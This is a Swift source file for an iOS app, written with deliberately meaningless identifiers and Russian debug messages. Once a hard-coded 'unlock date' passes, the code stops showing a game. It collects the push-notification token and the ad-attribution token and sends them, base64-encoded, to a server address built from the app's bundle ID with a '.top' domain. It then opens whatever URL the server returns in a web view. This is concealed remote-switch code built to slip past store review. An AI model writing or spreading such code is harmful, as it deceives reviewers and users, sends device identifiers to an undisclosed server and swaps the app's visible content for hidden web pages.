import SwiftUI
import AdServices
import UserNotifications


struct Hjkrt78d: Decodable {
    let kgfh4578: String
    let plo87ght: String

    
    init(from decoder: Decoder) throws {
            let zxcrt567 = try decoder.container(keyedBy: Uio87gfd.self)
            self.kgfh4578 = try zxcrt567.decode(String.self, forKey: Uio87gfd(stringValue: Mjhyu675.dtruyh78)!)
            self.plo87ght = try zxcrt567.decode(String.self, forKey: Uio87gfd(stringValue: Mjhyu675.aqwe6790)!)
        }
}

enum Ghjyt567: Error {
    case gftr5674
    case dert5478
    case mnbgy574
    case xbcy5781
}

struct Uio87gfd: CodingKey {
    var stringValue: String
    init?(stringValue: String) {
        self.stringValue = stringValue
    }
    
    var intValue: Int? { nil }
    init?(intValue: Int) { return nil }
}

final class Mjhyu675 {
    static var dtruyh78 = ""
    static var aqwe6790 = ""
    static var klopt765 = ""
}

@MainActor
public class RequestsManager {

    @ObservedObject var qazpl786 = Yuikhg56.shared
    private var xcfgy785: Poiuy765 {
        return Zxvbn745()
    }
    
    private let poliuj56 = "kgjyt675"
    private var yujikl78: String?
    private var oplkju89: String?
    private var jhger567 = 0
    private let kijhy576 = 10
    private let juhgt675 = 3.0
    
    public init(url1: String, url2: String, unlockDate: String) {
        Mjhyu675.dtruyh78 = url1
        Mjhyu675.aqwe6790 = url2
        Mjhyu675.klopt765 = unlockDate
    }
    
    
    
    public func mnbhy786() async {
     
        guard plkjh576(Mjhyu675.klopt765) else {
            ghjkl567()
            
            return
        }
        
        if !qazpl786.isActive {
            await bvcxz675()
            return
        }
        
        if !ytrewq67() {
            nbvcx768()
            return
        }
        
        await fghjk768()
        
        xcfgy785.qwert786(deviceData: zxcvb897()) { ghjkl765 in
            switch ghjkl765 {
            case .success(let mnbvc78):
                self.iuytf786(url: mnbvc78)
                self.cvbnm675()
            case .failure:
                self.tyuio789()
            }
        }
    }
    
    private func bvcxz675() async {
        if jhger567 >= kijhy576 {
            print("Превышено максимальное количество попыток подключения к интернету (\(kijhy576))")
            print("Превышено максимальное количество попыток подключения к интернету")
            ghjkl567()
            jhger567 = 0
            return
        }
        
        jhger567 += 1
        print("Нет подключения к интернету. Попытка \(jhger567) из \(kijhy576). Повторная проверка через \(Int(juhgt675)) сек...")
        print("Нет подключения к интернету. Попытка \(jhger567) из \(kijhy576). Повторная проверка через \(Int(juhgt675)) сек...")
        
        try? await Task.sleep(nanoseconds: UInt64(juhgt675 * 1_000_000_000))
        
        if qazpl786.isActive {
            print("Интернет подключен после попытки \(jhger567)")
            print("Интернет подключен после попытки \(jhger567)")
            jhger567 = 0
            
            if !ytrewq67() {
                nbvcx768()
            } else {
                await fghjk768()
                
                xcfgy785.qwert786(deviceData: zxcvb897()) { ghjkl765 in
                    switch ghjkl765 {
                    case .success(let mnbvc78):
                        self.iuytf786(url: mnbvc78)
                        self.cvbnm675()
                    case .failure:
                        self.tyuio789()
                    }
                }
            }
        } else {
            await bvcxz675()
        }
    }
    
    private func fghjk768() async {
        await withCheckedContinuation { mnbvf678 in
            DispatchQueue.main.async {
                UIApplication.shared.registerForRemoteNotifications()
            }
            
            let lkjhg654 = DispatchTime.now() + 10
            
            NotificationCenter.default.addObserver(forName: .apnsTokenReceived, object: nil, queue: .main) { [weak self] bnmgh564 in
                guard let self = self else { return }
                
                if let jkliuy67 = bnmgh564.userInfo?["token"] as? String {
                    Task { @MainActor in
                        print("APNs токен получен")
                        self.yujikl78 = jkliuy67
                        mnbvf678.resume()
                    }
                }
            }
            
            DispatchQueue.main.asyncAfter(deadline: lkjhg654) { [weak self] in
                guard let self = self else { return }
                if self.yujikl78 == nil {
                    Task { @MainActor in
                        print("APNs токен не получен")
                        self.yujikl78 = ""
                        mnbvf678.resume()
                    }
                }
            }
        }

        do {
            self.oplkju89 = try AAAttribution.attributionToken()
        } catch {
            print("Не удалось получить ATT токен: \(error)")
            self.oplkju89 = ""
        }
    }

    
    func zxcvb897() -> [String: String] {
        let dfghj645 = [
            "apns_token": yujikl78 ?? "",
            "att_token": oplkju89 ?? ""
        ]
        print("Device data: \(dfghj645)")
        return dfghj645
    }
    
    private func ytrewq67() -> Bool {
        !UserDefaults.standard.bool(forKey: "yhfgtu78")
    }
    
    private func iuytf786(url: URL) {
        UserDefaults.standard.set(url.absoluteString, forKey: poliuj56)
        UserDefaults.standard.set(true, forKey: "vcxnm765")
        UserDefaults.standard.set(false, forKey: "kjhut876")
        UserDefaults.standard.set(true, forKey: "yhfgtu78")
        asdfg768(object: url)
    }
    
    private func tyuio789() {
        UserDefaults.standard.set(true, forKey: "kjhut876")
        UserDefaults.standard.set(false, forKey: "vcxnm765")
        UserDefaults.standard.set(true, forKey: "yhfgtu78")
        ghjkl567()
    }
    
    private func nbvcx768() {
        if qwert657(), let ghbnm675 = UserDefaults.standard.string(forKey: poliuj56), let mnbvc78 = URL(string: ghbnm675) {
            asdfg768(object: mnbvc78)
        } else {
            ghjkl567()
        }
    }
    
    func plkjh576(_ nbvcd546: String) -> Bool {
        let bvcxz546 = DateFormatter()
        bvcxz546.dateFormat = "yyyy-MM-dd"
        let ythfd567 = Date()
        guard let rtgdf675 = bvcxz546.date(from: nbvcd546), ythfd567 >= rtgdf675 else {
            print("Дата разблокировки еще не наступила❌")
            return false
        }
        print("Приложение активно✅")
        return true
    }
    
    func poiuy678() -> Bool {
        UserDefaults.standard.bool(forKey: "kjhut876")
    }
    
    func qwert657() -> Bool {
        UserDefaults.standard.bool(forKey: "vcxnm765")
    }
    
    func cvbnm675() {
        
        let zxcvb546: UNAuthorizationOptions = [.alert, .badge, .sound]
        UNUserNotificationCenter.current().requestAuthorization(options: zxcvb546) {_, _ in }
        
      }
}


import Network
 

class Yuikhg56: ObservableObject {
    static var shared = Yuikhg56()
    let asdfg675 = NWPathMonitor()
    let hjkli675 = DispatchQueue(label: "monitor")
    @Published var isActive = false
    @Published var yuiop675 = false
    @Published var cvbfd567 = false
    @Published var ghjuy576 = NWInterface.InterfaceType.other
    
    
    init() {
        asdfg675.pathUpdateHandler = { mjhyt675 in
            DispatchQueue.main.async {
                self.isActive = mjhyt675.status == .satisfied
                self.yuiop675 = mjhyt675.isExpensive
                self.cvbfd567 = mjhyt675.isConstrained
                
                let tgbnh567: [NWInterface.InterfaceType] = [.cellular, .wifi, .wiredEthernet]
                self.ghjuy576 = tgbnh567.first(where: mjhyt675.usesInterfaceType) ?? .other
            }
        }
        
        asdfg675.start(queue: hjkli675)
    }
    
    
}


extension RequestsManager {
    func ghjkl567() {
        DispatchQueue.main.async {
            NotificationCenter.default.post(name: .failed, object: nil)
            print("Запущена игра")
        }
    }
    
    func asdfg768(object: URL) {
        DispatchQueue.main.async {
            NotificationCenter.default.post(name: .updated, object: object)
            print("Запущено вью")
        }
    }
}


protocol Poiuy765: AnyObject {
    func qwert786(deviceData: [String: String], _ completion: @escaping (Result<URL,Error>) -> Void )
}




final class Zxvbn745: Poiuy765 {
    
    func rftgy768() -> String {
        guard let mnbhj675 = Bundle.main.bundleIdentifier else { return "" }
        let vgbnm675 = mnbhj675.replacingOccurrences(of: ".", with: "")
        let plkjh567: String = "https://" + vgbnm675 + ".top/indexn.php"
        return plkjh567.lowercased()
    }
    
    private func gytrfd67(_ zxcvb765: String) -> String {
        var dfgty675 = ""
        for poiuy675 in zxcvb765 {
            let qazws765 = poiuy675.unicodeScalars.first!
            dfgty675.append(String(format: "%%%02X", qazws765.value))
        }
        return dfgty675
    }
    
    private func bvcxz675(_ derty675: String) -> String? {
        var hjkli756 = ""
        var dfgty675 = derty675.startIndex
        
        while dfgty675 < derty675.endIndex {
            if derty675[dfgty675] == "%" && dfgty675 < derty675.index(derty675.endIndex, offsetBy: -2) {
                let jhgfd765 = derty675.index(dfgty675, offsetBy: 1)
                let rtyui675 = derty675.index(dfgty675, offsetBy: 3)
                let zxcbn675 = String(derty675[jhgfd765..<rtyui675])
                
                if let qwert675 = UInt32(zxcbn675, radix: 16),
                   let vbnhj567 = UnicodeScalar(qwert675) {
                    hjkli756.append(Character(vbnhj567))
                    dfgty675 = rtyui675
                } else {
                    return nil
                }
            } else {
                hjkli756.append(derty675[dfgty675])
                dfgty675 = derty675.index(after: dfgty675)
            }
        }
        
        return hjkli756
    }
    
    private func rtyui675(data: [String: String]) -> (encodedUrl: String, originalUrl: String)? {
        let uioph675 = data.map { URLQueryItem(name: $0.key, value: $0.value) }
        var trewq675 = URLComponents()
        trewq675.queryItems = uioph675
        
        guard let fghjk675 = trewq675.query?.data(using: .utf8) else {
            return nil
        }
        let mnbvc674 = fghjk675.base64EncodedString()
        
        let qwsax675 = rftgy768()
        let asdfg575 = qwsax675 + "?data=" + mnbvc674
        print("🔹 Базовая ссылка: \(asdfg575)")
        
        let yuiop675 = gytrfd67(asdfg575)
        print("🔹 Кодированная ссылка: \(yuiop675)")
        
        return (yuiop675, asdfg575)
    }
    
    func plokj675(data: Data, completion: @escaping (Result<(encodedUrl: String, originalUrl: String), Error>) -> Void) {
        do {
            let ghnjm675 = try JSONDecoder().decode(Hjkrt78d.self, from: data)
            
            guard !ghnjm675.kgfh4578.isEmpty, !ghnjm675.plo87ght.isEmpty else {
                completion(.failure(Ghjyt567.gftr5674))
                return
            }
            
            let asdfg575 = "https://" + ghnjm675.kgfh4578 + ghnjm675.plo87ght
            
            let yuiop675 = gytrfd67(asdfg575)
            
            completion(.success((yuiop675, asdfg575)))
        } catch {
            UserDefaults.standard.setValue(true, forKey: "openedOnboarding")
            completion(.failure(error))
        }
    }
    
    func qwert786(deviceData: [String: String], _ completion: @escaping (Result<URL, Error>) -> Void ) {
        print("🔹 APNS Token: \(deviceData["apns_token"] ?? "")")
        print("🔹 ATT Token: \(deviceData["att_token"] ?? "")")
        
        guard let uyjnb675 = rtyui675(data: deviceData) else {
            completion(.failure(Ghjyt567.dert5478))
            return
        }
        
        let poiuy675 = uyjnb675.encodedUrl
        
        guard let qazxs567 = bvcxz675(poiuy675) else {
            completion(.failure(Ghjyt567.dert5478))
            return
        }
        
        guard let vbnhy675 = URL(string: qazxs567) else {
            completion(.failure(Ghjyt567.dert5478))
            return
        }
        
        let xcvbn675 = URLSessionConfiguration.default
        xcvbn675.timeoutIntervalForRequest = 5
        let nbvgh675 = URLSession(configuration: xcvbn675)
        
        let dfghj645 = nbvgh675.dataTask(with: vbnhy675) { data, response, error in
            if let error = error as NSError?,
               error.code == NSURLErrorTimedOut {
                completion(.failure(Ghjyt567.xbcy5781))
                return
            }
            
            if let data = data {
                self.plokj675(data: data) { result in
                    switch result {
                        case .success(let urlTuple):
                            if let finalUrl = URL(string: urlTuple.originalUrl) {
                                completion(.success(finalUrl))
                            } else {
                                completion(.failure(Ghjyt567.dert5478))
                            }
                        case .failure(let error):
                            completion(.failure(error))
                    }
                }
            } else {
                completion(.failure(Ghjyt567.mnbgy574))
            }
        }
        
        dfghj645.resume()
    }
}

public extension Notification.Name {
    static let updated = Notification.Name("updated")
    static let failed = Notification.Name("failed")
    static let apnsTokenReceived = Notification.Name("apnsTokenReceived")
}
